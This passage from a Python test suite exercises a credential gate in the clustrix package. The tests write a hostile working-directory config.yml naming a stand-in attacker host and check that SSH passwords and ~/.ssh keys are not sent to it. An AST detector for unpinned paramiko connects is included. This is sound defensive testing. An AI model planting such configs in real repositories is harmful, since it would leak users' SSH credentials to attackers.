    pytest.importorskip("ipywidgets")
    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget


# --------------------------------------------------------------------------
# The other half of the widget's Apply: the false refusal.
#
# ``config_source_map`` is keyed by configuration *name*. ``_on_apply_config``
# stamps ``_save_config_from_widgets()`` -- the **live** fields. Selecting the
# repository's ``./config.yml`` and then typing your *own* hostname over the
# host field left the name unchanged, so Apply stamped the working-directory
# source onto a hostname that file never named, and
# ``_HOSTS_NAMED_BY_UNTRUSTED_SOURCES`` recorded the user's own cluster. That
# record is deliberately proof against ``configure()`` -- Apply *is* a
# ``configure()`` call -- so a single keystroke cost the user their cluster
# for the life of the kernel.
#
# A hostname is only condemned by a source that actually named it.
# --------------------------------------------------------------------------

#: A name for the host the repository chose that is *not* loopback, so that
#: "the file's host" and "the user's own host" are distinguishable. Nothing
#: connects to it: the point of these two tests is which of two hostnames the
#: provenance record ends up holding.
UNRELATED_ATTACKER_HOST = "totally-unrelated.attacker.example"


def _repository_config_naming(host, tmp_path, monkeypatch):
    """chdir into a cloned repository that ships ``./config.yml``."""
    repo = tmp_path / "cloned-repository"
    repo.mkdir()
    (repo / "config.yml").write_text(
        "\n".join(
            [
                "cluster_type: ssh",
                f"cluster_host: {host}",
                "username: victim",
                "ssh_host_key_policy: auto_add",
                'name: ""',
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    monkeypatch.chdir(repo)
    return repo


def _clusterfy_widget():
    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    widget = EnhancedClusterConfigWidget()
    assert "config" in widget.config_dropdown.options, (
        f"the widget did not offer the repository's config.yml: "
        f"{widget.config_dropdown.options}"
    )
    widget.config_dropdown.value = "config"
    return widget


def test_the_widget_still_condemns_the_host_the_found_file_named(tmp_path, monkeypatch):
    """The control. Applying the file *unchanged* still refuses it.

    Without this the fix below could be "stop stamping anything", which
    would reopen the leak the widget's Apply was made to close.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    widget._on_apply_config(None)

    assert get_config().cluster_host == UNRELATED_ATTACKER_HOST
    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY
    assert config_module._HOSTS_NAMED_BY_UNTRUSTED_SOURCES == {
        UNRELATED_ATTACKER_HOST: CONFIG_SOURCE_WORKING_DIRECTORY
    }
    assert stored_credential_is_for_config(get_config(), {}) is not None


def test_typing_your_own_hostname_over_a_found_config_does_not_condemn_it(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """The false refusal, measured against a real server.

    RED before the fix: ``_HOSTS_NAMED_BY_UNTRUSTED_SOURCES ==
    {'127.0.0.1': 'working-directory'}``, ``trusted=False``, the connection
    is refused and ``server.authentications == []`` -- the user's own cluster,
    condemned for the life of the process by a file that named a different
    host entirely.

    ``attacker_server`` here plays the user's *own* cluster: it is a real SSH
    server that accepts the sentinel and nothing else, so an entry in
    ``authentications`` is a measurement that the credential really travelled
    to the host the user typed.

    Rewritten in the #167 merge (fixes -> credential-gate): on ``work/fixes``
    an Apply cleared ``_HOSTS_NAMED_BY_UNTRUSTED_SOURCES`` wholesale, which
    also un-condemned the *attacker's* host the same file had named -- route
    12's laundering path with a keystroke in front of it. The merged rule is
    the gate's: the record is per-host and never cleared, so the file's host
    stays refused while the host the user actually typed was never recorded
    at all and connects.
    """
    pytest.importorskip("ipywidgets")
    env_file(SSH_PASSWORD=SENTINEL_PASSWORD)
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    # The user's own documented setting, and the only friction the widget
    # does not carry across by itself: ``_save_config_from_widgets`` never
    # emits ``ssh_host_key_policy``, so it has to already be in force for the
    # connection to get as far as offering a password. Setting it here is a
    # plain ``configure()`` call naming no host, so it stamps nothing.
    configure(ssh_host_key_policy="auto_add")

    widget = _clusterfy_widget()
    # The one edit that matters: the user types their own hostname.
    widget.host_field.value = attacker_server.host
    widget.port_field.value = attacker_server.port
    widget._on_apply_config(None)

    assert get_config().cluster_host == attacker_server.host
    # The file's host stays condemned -- that is the point of the record --
    # and the host the user typed appears nowhere in it.
    assert config_module._HOSTS_NAMED_BY_UNTRUSTED_SOURCES == {
        config_module.normalize_hostname(
            UNRELATED_ATTACKER_HOST
        ): CONFIG_SOURCE_WORKING_DIRECTORY
    }, ("the record must hold the file's host and not the hostname the user " "typed")
    assert config_module.source_that_named_hostname(attacker_server.host) is None
    assert get_config_source(get_config()) == CONFIG_SOURCE_RUNTIME
    assert stored_credential_is_for_config(get_config(), {}) is None

    assert _attempt_connection(), "the user's own cluster was refused"
    assert attacker_server.authentications == [("victim", "password")]


def test_editing_a_field_other_than_the_host_leaves_the_refusal_in_place(
    tmp_path, monkeypatch
):
    """It is the *host* that receives the credential, so only it counts.

    Changing the core count on a configuration a repository shipped is not
    the user choosing who gets their password.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    widget.cores_field.value = 17
    widget._on_apply_config(None)

    assert get_config().default_cores == 17
    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY
    assert config_module._HOSTS_NAMED_BY_UNTRUSTED_SOURCES == {
        UNRELATED_ATTACKER_HOST: CONFIG_SOURCE_WORKING_DIRECTORY
    }


def test_case_and_a_trailing_dot_do_not_slip_past_the_host_comparison(
    tmp_path, monkeypatch
):
    """The same hostname spelled differently is the same hostname.

    Otherwise "type your own hostname" becomes "retype the attacker's with a
    capital letter", which clears the refusal without changing who receives
    the credential.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    widget.host_field.value = UNRELATED_ATTACKER_HOST.upper() + "."
    widget._on_apply_config(None)

    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY
    assert config_module._HOSTS_NAMED_BY_UNTRUSTED_SOURCES == {
        UNRELATED_ATTACKER_HOST: CONFIG_SOURCE_WORKING_DIRECTORY
    }


# --------------------------------------------------------------------------
# Route 9b. The rename dropped the provenance on the floor.
#
# ``_on_config_name_change`` re-keyed ``self.configs`` and moved
# ``current_config_name``, and left ``config_source_map``,
# ``config_source_host_map`` and ``config_file_map`` keyed by a name that no
# longer existed. ``_discovered_source_for`` looks the *current* name up, so
# it found nothing, Apply stamped no provenance and ``configure()``'s
# ``runtime`` stood: selecting a repository's ``./config.yml`` and typing a
# name into the name box -- without touching the host -- was enough.
#
# Renaming is not choosing a hostname. Measured before the fix:
# ``config_source_map == {'config': 'working-directory'}`` while the
# configuration was called something else, and ``_discovered_source_for``
# returned ``None``.
# --------------------------------------------------------------------------


def _live_widget_fields(widget):
    """What Apply would stamp: the live fields, exactly as it reads them."""
    return widget._save_config_from_widgets()


def test_renaming_a_found_configuration_does_not_launder_it(tmp_path, monkeypatch):
    """RED before the fix: ``_discovered_source_for`` returned ``None``.

    The measurement is taken at ``_discovered_source_for`` rather than
    through ``_on_apply_config`` because on this branch Apply is dead for
    every *named* configuration -- ``_save_config_from_widgets`` emits
    ``name`` and ``configure()`` rejects it -- which is issue #165, fixed on
    its own branch. The existing widget guards above reach Apply only by
    writing ``name: ""`` into the fixture, and a rename is precisely what
    makes the name non-empty. ``_discovered_source_for`` is the function the
    defect is in and the only thing Apply consults about provenance, so it is
    where the guard belongs either way.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    assert widget._discovered_source_for(_live_widget_fields(widget)) == (
        CONFIG_SOURCE_WORKING_DIRECTORY
    )

    # The rename, driven the way a user drives it: by typing in the name box.
    widget.config_name.value = "my cluster"

    assert widget.current_config_name == "my cluster"
    assert "my cluster" in widget.configs
    assert widget._discovered_source_for(_live_widget_fields(widget)) == (
        CONFIG_SOURCE_WORKING_DIRECTORY
    ), "renaming a configuration a repository shipped cleared its provenance"

    # Every mapping keyed by the name moved with it; none is left describing
    # a name that no longer exists.
    assert widget.config_source_map == {"my cluster": CONFIG_SOURCE_WORKING_DIRECTORY}
    assert widget.config_source_host_map == {"my cluster": UNRELATED_ATTACKER_HOST}
    assert set(widget.config_file_map) == {"my cluster"}

    # And the fix is not "condemn everything after a rename": typing your own
    # hostname over it still works, because a hostname is only condemned by a
    # source that actually named it.
    widget.host_field.value = "my-own-cluster.example"
    assert widget._discovered_source_for(_live_widget_fields(widget)) is None


def test_renaming_onto_a_name_that_came_off_a_disk_does_not_inherit_it(
    tmp_path, monkeypatch
):
    """The other direction: a disk's provenance must not attach to someone else.

    **Rewritten deliberately for issue #171, not relaxed.** This test used to
    assert ``current_config_name == "config"`` and empty sidecars -- that is,
    it asserted that the rename *went through*, destroying the configuration
    the repository shipped, and only checked that its provenance did not ride
    along. Its own docstring recorded the destruction as "left alone here".
    The rename is now refused, so the property is asserted on the path that
    actually happens: nothing moves, in either map, in either direction.

    The security property is unchanged and is still the point -- the live
    fields are the built-in configuration's, and ``_discovered_source_for``
    must not find the repository's provenance under them.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    assert widget.config_source_map == {"config": CONFIG_SOURCE_WORKING_DIRECTORY}
    found_on_disk = copy.deepcopy(widget.configs["config"])

    # Select a configuration the widget built in, not one off a disk, and
    # try to rename it onto the found one's name.
    widget.config_dropdown.value = "Local Single-core"
    widget.config_name.value = "config"

    # Refused: the repository's configuration is still there, unaltered, and
    # so is the one the user was editing.
    assert widget.configs["config"] == found_on_disk
    assert widget.configs["Local Single-core"]["cluster_type"] == "local"
    assert widget.current_config_name == "Local Single-core"

    # No provenance moved, because no configuration moved.
    assert widget.config_source_map == {"config": CONFIG_SOURCE_WORKING_DIRECTORY}
    assert widget.config_source_host_map == {"config": UNRELATED_ATTACKER_HOST}
    assert set(widget.config_file_map) == {"config"}

    # And the built-in configuration the user is holding is still their own.
    assert widget._discovered_source_for(_live_widget_fields(widget)) is None


def test_a_refused_rename_does_not_leave_a_found_config_half_renamed(
    tmp_path, monkeypatch
):
    """The mirror: the *found* configuration is the one being renamed.

    A half-completed refusal here is the worse direction -- provenance moved
    onto a built-in name while the configuration it describes stayed put
    would both condemn a host no file ever named and clear the refusal on the
    host one did. Nothing moves, so neither happens.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    built_in = copy.deepcopy(widget.configs["Local Single-core"])

    # "config" is selected by ``_clusterfy_widget``; rename it onto a name a
    # built-in template already holds.
    widget.config_name.value = "Local Single-core"

    assert widget.configs["Local Single-core"] == built_in
    assert widget.current_config_name == "config"
    assert widget.config_source_map == {"config": CONFIG_SOURCE_WORKING_DIRECTORY}
    assert widget.config_source_host_map == {"config": UNRELATED_ATTACKER_HOST}
    assert set(widget.config_file_map) == {"config"}

    # The repository's configuration is still what it was, so it is still
    # refused -- the rename attempt neither laundered it nor moved it.
    assert widget._discovered_source_for(_live_widget_fields(widget)) == (
        CONFIG_SOURCE_WORKING_DIRECTORY
    )


def test_deleting_a_configuration_forgets_where_it_came_from(tmp_path, monkeypatch):
    """A deleted file's provenance must not attach to the next thing named that.

    ``_on_delete_config`` already dropped ``config_file_map`` -- the two
    source maps were simply forgotten when they were added.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    assert widget.config_source_map == {"config": CONFIG_SOURCE_WORKING_DIRECTORY}

    widget._on_delete_config(None)

    assert "config" not in widget.configs
    assert widget.config_source_map == {}
    assert widget.config_source_host_map == {}
    assert widget.config_file_map == {}


def test_a_rename_in_one_widget_does_not_edit_the_next_widget_s_templates(
    tmp_path, monkeypatch
):
    """``DEFAULT_CONFIGS.copy()`` is shallow, so the inner dicts were shared.

    Found by the two rename tests above interfering with each other:
    renaming a built-in configuration wrote ``name`` into the module-level
    template, and every widget built afterwards in the same kernel started
    from it -- so a fresh widget offered a "Local Single-core" whose name
    field said something else, and typing in that field renamed a
    configuration the user had not touched.
    """
    pytest.importorskip("ipywidgets")
    import clustrix.notebook_magic_config as notebook_magic_config

    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)
    before = copy.deepcopy(notebook_magic_config.DEFAULT_CONFIGS)

    widget = _clusterfy_widget()
    widget.config_dropdown.value = "Local Single-core"
    widget.config_name.value = "renamed by me"
    widget.cores_field.value = 17

    assert notebook_magic_config.DEFAULT_CONFIGS == before

    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    assert "renamed by me" not in EnhancedClusterConfigWidget().configs


# --------------------------------------------------------------------------
# Route 11. The "+" button. Same defect class as the rename above, and the
# door next to it: renaming *moves* a configuration between names, copying
# *creates* a second one -- and ``_on_add_config`` created it out of the live
# fields, which are still the found file's, then moved
# ``current_config_name`` onto it without carrying the name-keyed sidecars.
# ``_discovered_source_for`` then found nothing under the new name and
# Apply's ``configure()`` stamped ``runtime``, trusted.
#
# Measured on the wire before the fix: ``before "+" -> working-directory``,
# ``after "+" -> None`` / ``runtime`` / ``trusted=True``, and
# ``server.authentications == [("victim", "password")]`` -- the cloned
# repository's own host received the stored credential.
#
# Copying a configuration is not choosing a hostname.
# --------------------------------------------------------------------------


def _press_plus_then_clear_the_name(widget):
    """Press "+", then empty the name box, which is what makes Apply run.

    ``_save_config_from_widgets`` emits ``name`` and ``configure()`` rejects
    it, so Apply is dead for every *named* configuration (issue #165, fixed
    on its own branch) -- and "+" fills the name box in. Clearing it is
    therefore not a contrivance to reach the leak: on this branch it is the
    only state in which Apply applies anything at all. ``_on_config_name_
    change`` returns early on an empty name, so this renames nothing.
    """
    widget._on_add_config(None)
    assert widget.current_config_name == "New Configuration"
    widget.config_name.value = ""
    assert widget.current_config_name == "New Configuration"


def test_the_plus_button_does_not_launder_a_found_config_onto_the_wire(
    attacker_server, env_file, tmp_path, monkeypatch
):
    """The reproduction, end to end against a real SSH server.

    RED before the fix: ``source=runtime``, ``trusted=True`` and
    ``attacker_server.authentications == [("victim", "password")]``.
    """
    pytest.importorskip("ipywidgets")
    env_file(SSH_PASSWORD=SENTINEL_PASSWORD)

    repo = tmp_path / "cloned-repository"
    repo.mkdir()
    (repo / "config.yml").write_text(
        _config_text(attacker_server, name='""'), encoding="utf-8"
    )
    monkeypatch.chdir(repo)

    # The user's own documented setting; see the identical note above.
    configure(ssh_host_key_policy="auto_add")

    widget = _clusterfy_widget()
    assert widget._discovered_source_for(_live_widget_fields(widget)) == (
        CONFIG_SOURCE_WORKING_DIRECTORY
    )

    _press_plus_then_clear_the_name(widget)
    widget._on_apply_config(None)

    assert get_config().cluster_host == attacker_server.host
    assert attacker_server.authentications == [], (
        "pressing + on a config.yml the widget found in the working "
        "directory sent the stored credential to the host that file named: "
        + repr(attacker_server.authentications)
    )
    assert not _attempt_connection()
    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY


def test_opening_the_clusterfy_widget_does_not_taint_your_own_config_dir(
    attacker_server,
):
    """The positive control: a file in ``~/.clustrix`` is the user's own."""
    pytest.importorskip("ipywidgets")
    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    config_dir = get_config_dir()
    (config_dir / "config.yml").write_text(
        _config_text(attacker_server, name='""'), encoding="utf-8"
    )

    EnhancedClusterConfigWidget()

    assert config_module._HOSTS_NAMED_BY_UNTRUSTED_SOURCES == {}
    fresh = ClusterConfig(
        cluster_type="ssh", cluster_host=attacker_server.host, username="victim"
    )
    assert stored_credential_is_for_config(fresh, {"password": SENTINEL_PASSWORD}) is (
        None
    )


# ---------------------------------------------------------------------------
# Route 13: a refusal that still authenticates is not a refusal.
#
# Every connection path logged the gate's refusal and then called
# ``paramiko.connect()`` anyway with ``look_for_keys``/``allow_agent`` left
# at paramiko's defaults, so paramiko ran its own search of ``~/.ssh`` and
# the agent and authenticated. Strictly stronger than route 10: the hostile
# file need name nothing but ``cluster_host``.
# ---------------------------------------------------------------------------


def _repository_naming_only_the_host(server, tmp_path, monkeypatch):
    """A ``./clustrix.yml`` with no credential field of any kind in it."""
    cloned_repository = tmp_path / "cloned-repository"
    cloned_repository.mkdir()
    (cloned_repository / "clustrix.yml").write_text(
        _config_text(server), encoding="utf-8"
    )
    monkeypatch.chdir(cloned_repository)
    with pytest.warns(UserWarning, match="current working directory"):
        config_module._load_default_config()
    assert get_config().key_file is None
    assert get_config().password is None
    assert get_config_source(get_config()) == CONFIG_SOURCE_WORKING_DIRECTORY


@pytest.fixture
def key_only_server(tmp_path):
    """A server that accepts the victim's ``~/.ssh`` key and no password."""
    private, public = _victim_keypair(tmp_path)
    root = tmp_path / "attacker-root"
    root.mkdir()
    with LocalSSHServer(
        root=str(root), password=None, authorized_keys=[str(public)]
    ) as server:
        yield server


def test_the_execution_path_does_not_let_paramiko_find_the_key_itself(
    key_only_server, env_file, tmp_path, monkeypatch
):
    """Route 13 on ``ConnectionManager.setup_ssh_connection``.

    RED before the fix: ``server.authentications == [('victim',
    'publickey')]`` while the log line above it says the credential was
    refused. Nothing in the repository's file names a key -- paramiko found
    ``~/.ssh/id_rsa`` on its own.
    """
    env_file()
    _repository_naming_only_the_host(key_only_server, tmp_path, monkeypatch)

    authenticated = _attempt_connection()

    assert key_only_server.authentications == [], (
        "paramiko's own key search authenticated to a host named by a file "
        "in the working directory: " + repr(key_only_server.authentications)
    )
    assert not authenticated


def test_the_filesystem_path_does_not_let_paramiko_find_the_key_itself(
    key_only_server, env_file, tmp_path, monkeypatch
):
    """Route 13 on ``ClusterFilesystem``. A filesystem call is a connection."""
    from clustrix.filesystem import ClusterFilesystem

    env_file()
    _repository_naming_only_the_host(key_only_server, tmp_path, monkeypatch)

    with pytest.raises(Exception):
        ClusterFilesystem(get_config()).ls(".")

    assert key_only_server.authentications == [], (
        "a filesystem call authenticated with the victim's own key to a "
        "host named by a working-directory file: "
        + repr(key_only_server.authentications)
    )


def test_the_validation_path_does_not_let_paramiko_find_the_key_itself(
    key_only_server, env_file, tmp_path, monkeypatch
):
    """Route 13 on ``validate_ssh_key_auth`` -- the widget's Test button.

    This one asked no gate at all: ``run_comprehensive_validation`` consults
    it, but in a *different function*, and
    ``ModernClustrixWidget`` calls this one directly. Opening a notebook in
    the cloned directory and clicking "Test connection" was enough.
    """
    from clustrix.validation import validate_ssh_key_auth

    env_file()
    _repository_naming_only_the_host(key_only_server, tmp_path, monkeypatch)
    config = get_config()
    config.ssh_port = config.cluster_port

    assert validate_ssh_key_auth(config) is False
    assert key_only_server.authentications == [], (
        "the widget's connection test offered the victim's key to a host "
        "named by a working-directory file: " + repr(key_only_server.authentications)
    )


def test_the_local_identities_still_reach_a_host_the_user_chose(
    key_only_server, env_file, tmp_path
):
    """The fix must not turn ``~/.ssh/id_rsa`` off for everybody.

    The ordinary setup -- a key in ``~/.ssh`` and a host in the clustrix
    configuration directory -- is the case that has to keep working, on all
    three paths, or this is not a gate but an outage.
    """
    from clustrix.filesystem import ClusterFilesystem
    from clustrix.validation import validate_ssh_key_auth

    env_file()
    (get_config_dir() / "config.yml").write_text(
        _config_text(key_only_server), encoding="utf-8"
    )
    config_module._load_default_config()
    config = get_config()
    config.ssh_port = config.cluster_port

    assert _attempt_connection() is True
    assert ClusterFilesystem(config).ls(".") is not None
    assert validate_ssh_key_auth(config) is True
    assert set(key_only_server.authentications) == {("victim", "publickey")}
    assert len(key_only_server.authentications) == 3


def _the_host_is_already_known(server):
    """A ``known_hosts`` entry for ``server``, as ``ssh-keyscan`` would write.

    The widget's connectivity test verifies host keys strictly whatever the
    file said -- ``_save_config_from_widgets`` never emits
    ``ssh_host_key_policy``, so the dict it hands over carries none and the
    secure default applies. Without a known key the handshake fails before
    authentication is ever attempted, and both arms below would record
    nothing for reasons that have nothing to do with credentials. A host the
    user has connected to before is exactly this file, so this is the
    precondition the route needs rather than a concession to it.
    """
    known_hosts = pathlib.Path.home() / ".ssh" / "known_hosts"
    known_hosts.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
    known_hosts.write_text(
        "".join(
            f"[{server.host}]:{server.port} {key.get_name()} {key.get_base64()}\n"
            for key in server.host_keys()
        ),
        encoding="utf-8",
    )
    known_hosts.chmod(0o600)


def _clusterfy_widget_testing(config_name):
    """Drive the real ``%%clusterfy`` widget: pick the config, press Test."""
    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    widget = EnhancedClusterConfigWidget()
    assert config_name in widget.config_dropdown.options, (
        f"the widget did not offer {config_name!r}: "
        f"{widget.config_dropdown.options}"
    )
    widget.config_dropdown.value = config_name
    widget._on_test_config(None)
    return widget


def test_the_widget_connectivity_test_does_not_let_paramiko_find_the_key_itself(
    key_only_server, env_file, tmp_path, monkeypatch
):
    """Route 13 on the ``%%clusterfy`` widget's "Test configuration" button.

    The last unconverted call site, and the one that looked hardest to
    convert: ``_test_ssh_connectivity`` is handed a dict of *form fields*,
    not a ``ClusterConfig``, so it could ask the gate only by building one or
    by writing a second, weaker copy of the rule. It builds one --
    ``_config_under_test`` -- because two copies of a rule like this drift,
    and the drift is invisible until they disagree.

    RED before the fix: ``[('victim', 'publickey')]``. Nothing was typed into
    the password or key box and the repository's file names no credential of
    any kind; paramiko found ``~/.ssh/id_rsa`` by itself, for a host a
    ``./clustrix.yml`` chose.
    """
    pytest.importorskip("ipywidgets")
    env_file()
    _repository_naming_only_the_host(key_only_server, tmp_path, monkeypatch)
    _the_host_is_already_known(key_only_server)

    _clusterfy_widget_testing("clustrix")

    assert key_only_server.authentications == [], (
        "the widget's Test button offered the victim's own key to a host "
        "named by a working-directory file: " + repr(key_only_server.authentications)
    )


def test_the_widget_connectivity_test_still_reaches_a_host_the_user_chose(
    key_only_server, env_file
):
    """And the button does not become one that refuses everything.

    The identical widget flow, with the identical file in the clustrix
    configuration directory instead of the working directory. Testing a
    connection to your own cluster with the key you already have is the whole
    purpose of the button.
    """
    pytest.importorskip("ipywidgets")
    env_file()
    (get_config_dir() / "config.yml").write_text(
        _config_text(key_only_server), encoding="utf-8"
    )
    _the_host_is_already_known(key_only_server)

    _clusterfy_widget_testing("config")

    assert key_only_server.authentications == [
        ("victim", "publickey")
    ], "the widget's Test button stopped working for a host the user chose: " + repr(
        key_only_server.authentications
    )


def test_a_form_with_no_host_yet_is_not_a_form_that_may_use_your_keys(tmp_path):
    """Half-filled is neither an error to raise nor a reason to trust.

    The user is still typing, so this may not blow up; there is nobody to
    decide about, so it may not connect either. It reports and stops.
    """
    pytest.importorskip("ipywidgets")
    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    widget = EnhancedClusterConfigWidget()

    answer = widget._test_ssh_connectivity({"username": "victim"})

    assert answer[0] is False
    assert "host" in answer[1]


#: Every paramiko connection has to decide whether paramiko may run its own
#: search of ``~/.ssh`` and the ssh-agent. Both default to yes, so a call
#: that names neither has not taken the decision -- it has inherited one.
LOCAL_IDENTITY_SETTINGS = ("look_for_keys", "allow_agent")


def _unpinned_paramiko_connects(text):
    """``x.connect(...)`` calls in ``text`` that leave either setting open.

    A ``connect`` call carrying keywords is paramiko's: clustrix's own
    ``self.connect()`` takes none, and ``socket.connect((host, port))``
    passes a positional tuple. Both settings must be named -- as literal
    keywords on the call, or, for the call sites that assemble a ``**kwargs``
    dict, as string keys anywhere in the innermost enclosing function.

    Reading the enclosing function is what lets the rule cover the shape the
    connection paths actually use, and it is equally the rule's limit: a
    function that merely mentions the names passes. It detects "somebody
    added another ``connect``", which is the realistic regression, not an
    adversary.
    """
    import ast

    tree = ast.parse(text)
    offenders = []

    def settings_named_in(scope):
        return {
            node.value
            for node in ast.walk(scope)
            if isinstance(node, ast.Constant) and node.value in LOCAL_IDENTITY_SETTINGS
        }

    def visit(node, scope):
        for child in ast.iter_child_nodes(node):
            if (
                isinstance(child, ast.Call)
                and isinstance(child.func, ast.Attribute)
                and child.func.attr == "connect"
                and child.keywords
            ):
                named = settings_named_in(scope) | {kw.arg for kw in child.keywords}
                missing = tuple(s for s in LOCAL_IDENTITY_SETTINGS if s not in named)
                if missing:
                    offenders.append((child.lineno, missing))
            inner = (
                child
                if isinstance(child, (ast.FunctionDef, ast.AsyncFunctionDef))
                else scope
            )
            visit(child, inner)

    visit(tree, tree)
    return sorted(set(offenders))


def test_no_connection_path_leaves_paramikos_own_key_search_to_paramiko():
    """The rule that stops a sixth route-13 call site appearing.

    Five were found by reading the tree, and reading the tree again is not a
    control. ``deploy_public_key`` was the sixth, found by this rule rather
    than by the audit that found the others: its "try with existing keys"
    branch named neither setting, and paramiko offers agent keys and
    ``~/.ssh`` *before* a password, so its password branch presented them
    too.
    """
    package = pathlib.Path(config_module.__file__).parent

    offenders = {}
    for path in sorted(package.glob("*.py")):
        found = _unpinned_paramiko_connects(path.read_text(encoding="utf-8"))
        if found:
            offenders[path.name] = found

    assert not offenders, (
        "a paramiko connect() left look_for_keys/allow_agent at paramiko's "
        "defaults, so a refusal by the gate would be followed by an "
        "authentication out of ~/.ssh or the agent anyway (route 13): "
        + repr(offenders)
    )


def _a_public_key_to_deploy(tmp_path):
    """A public key file for ``deploy_public_key`` to install. Not a secret."""
    path = tmp_path / "to-deploy.pub"
    path.write_text(
        f"ssh-rsa {paramiko.RSAKey.generate(2048).get_base64()} deployed\n",
        encoding="utf-8",
    )
    return path


def test_key_deployment_does_not_offer_your_key_collection_to_a_repo_host(
    key_only_server, env_file, tmp_path, monkeypatch
):
    """The sixth call site, and the rule above is what found it.

    ``deploy_public_key`` named neither setting on either branch. Its
    no-password branch is *literally* "try with existing keys", and paramiko
    offers agent keys and ``~/.ssh`` before it offers a password, so the
    branch that was handed one presented them first as well. Reached from
    ``setup_ssh_keys`` the decision has already been taken; this function is
    public and ``deploy_ssh_key`` is a second door into it.

    Measured at ``f31a98f``: ``RESULT True AUTH [('victim', 'publickey')]``
    -- the victim's own key authenticated *and* the requested key was
    installed in the attacker's ``authorized_keys``.

    ``ssh-copy-id`` runs before the paramiko fallback and is deliberately not
    suppressed: it is a subprocess offering OpenSSH's own default identity,
    so if it ever authenticates here that is a finding rather than noise.
    """
    from clustrix.ssh_utils import deploy_public_key

    env_file()
    to_deploy = _a_public_key_to_deploy(tmp_path)
    _repository_naming_only_the_host(key_only_server, tmp_path, monkeypatch)

    # The refusal surfaces as SSHKeyDeploymentError; letting it propagate
    # would make the first assertion be about the exception rather than
    # about what the server saw, and what the server saw is the measurement.
    try:
        deployed = deploy_public_key(
            key_only_server.host,
            "victim",
            str(to_deploy),
            key_only_server.port,
            None,
            config=get_config(),
        )
    except Exception:
        deployed = False

    assert key_only_server.authentications == [], (
        "key deployment authenticated with the victim's own key to a host "
        "named by a working-directory file: " + repr(key_only_server.authentications)
    )
    assert deployed is False


def test_key_deployment_still_works_for_a_host_the_user_chose(
    key_only_server, env_file, tmp_path
):
    """Deploying a key to your own cluster is the feature, and it survives."""
    from clustrix.ssh_utils import deploy_public_key

    env_file()
    to_deploy = _a_public_key_to_deploy(tmp_path)
    (get_config_dir() / "config.yml").write_text(
        _config_text(key_only_server), encoding="utf-8"
    )
    config_module._load_default_config()

    deployed = deploy_public_key(
        key_only_server.host,
        "victim",
        str(to_deploy),
        key_only_server.port,
        None,
        config=get_config(),
    )

    assert deployed is True
    assert set(key_only_server.authentications) == {("victim", "publickey")}


def test_the_connect_rule_fires_on_what_it_is_for_and_nothing_else():
    """Kills: matching every ``.connect``, and matching only literal keywords.

    A rule that cries at ``self.connect()`` or at a socket is a rule somebody
    deletes; a rule that misses ``connect(**kwargs)`` misses every shipped
    connection path, all of which build a dict.
    """
    assert _unpinned_paramiko_connects(
        "def f(c):\n    c.connect(hostname='h', username='u')\n"
    ) == [(2, ("look_for_keys", "allow_agent"))]
    assert _unpinned_paramiko_connects(
        "def f(c):\n    c.connect(hostname='h', allow_agent=False)\n"
    ) == [(2, ("look_for_keys",))]
    assert (
        _unpinned_paramiko_connects(
            "def f(c):\n"
            "    c.connect(hostname='h', look_for_keys=False, allow_agent=False)\n"
        )
        == []
    )

    # The shape every shipped connection path uses.
    assert (
        _unpinned_paramiko_connects(
            "def f(c):\n"
            "    kw = {'hostname': 'h'}\n"
            "    kw['look_for_keys'] = False\n"
            "    kw['allow_agent'] = False\n"
            "    c.connect(**kw)\n"
        )
        == []
    )
    # ...and the dict has to be the one this function built.
    assert _unpinned_paramiko_connects("def f(c, kw):\n    c.connect(**kw)\n") == [
        (2, ("look_for_keys", "allow_agent"))
    ]

    # Not clustrix's own method, and not a socket.
    assert _unpinned_paramiko_connects("def f(self):\n    self.connect()\n") == []
    assert _unpinned_paramiko_connects("def f(s, h, p):\n    s.connect((h, p))\n") == []

    # A sibling function's pinning does not vouch for this one.
    assert _unpinned_paramiko_connects(
        "def pinned(c):\n"
        "    c.connect(hostname='h', look_for_keys=False, allow_agent=False)\n"
        "\n"
        "def unpinned(c):\n"
        "    c.connect(hostname='h')\n"
    ) == [(5, ("look_for_keys", "allow_agent"))]


def test_the_gate_decides_the_local_identity_search_not_the_call_site():
    """It is a field of the release, so a call site cannot forget it.

    Three call sites each deciding for themselves is how there came to be
    three of them wrong, and a ``CredentialRelease`` built anywhere else
    must not open the search by omission.
    """
    trusted = ClusterConfig(cluster_host="chosen.example.edu", username="victim")
    untrusted = ClusterConfig(cluster_host="named-by-a-file.example")
    record_discovered_hostname(untrusted.cluster_host, CONFIG_SOURCE_WORKING_DIRECTORY)

    allowed = release_credential(CredentialTarget.for_config(trusted), config=trusted)
    refused = release_credential(
